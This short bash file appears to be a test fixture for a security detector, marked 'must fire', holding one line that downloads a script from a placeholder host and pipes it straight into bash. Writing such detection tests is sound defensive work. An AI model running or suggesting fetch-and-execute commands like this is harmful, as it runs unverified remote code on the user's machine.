#!/usr/bin/env bash
set -euo pipefail

# must fire: fetched bytes go straight into an interpreter
curl -sS https://example.invalid/install.sh | bash
